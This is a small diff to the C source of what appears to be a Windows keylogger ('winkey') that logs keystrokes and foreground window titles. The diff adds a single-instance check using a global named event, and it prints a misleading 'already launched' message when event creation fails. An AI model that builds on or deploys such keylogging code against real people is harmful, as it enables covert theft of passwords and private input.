@@ -2,6 +2,7 @@
 
 extern BOOL foregroundWindowChanged;
 extern char foregroundWindowTitle[4096];
+extern HANDLE startEvent;
 
 /**
  * This function prints text representation of a virtual key, according to a mode.
@@ -897,4 +898,18 @@ VOID GetWindowTitle(HWND hwnd)
     if (!strlen(foregroundWindowTitle))
         log("[NO WINDOW]", CHAR_MODE, TRUE);
     foregroundWindowChanged = TRUE;
+}
+
+VOID CheckOneInstance(void)
+{
+    startEvent = CreateEventA(NULL, TRUE, FALSE, "Global\\WinkeyEventStart");//global needed to have the event reachable in all sessions
+    if (startEvent != NULL && GetLastError() == ERROR_ALREADY_EXISTS)
+    {
+        CloseHandle(startEvent);
+        printf("winkey already launched.\n");
+        exit(1);
+    }
+    else if (startEvent != NULL) return;
+    printf("winkey already launched.\n");
+    exit(1);
 }
